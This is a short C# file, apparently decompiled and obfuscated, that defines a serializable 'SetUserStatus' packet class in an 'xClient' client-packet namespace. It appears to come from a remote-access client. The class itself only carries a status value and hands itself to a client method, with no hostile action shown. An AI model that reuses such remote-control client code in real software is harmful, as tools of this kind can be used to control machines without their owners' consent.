using System;

namespace xClient.Core.Packets.ClientPackets;

[Serializable]
public class SetUserStatus : GInterface4
{
	public GEnum3 Message { get; set; }

	public SetUserStatus()
	{
	}

	public SetUserStatus(GEnum3 message)
	{
		Message = message;
	}

	public void Execute(GClass33 client)
	{
		client.method_7(this);
	}
}
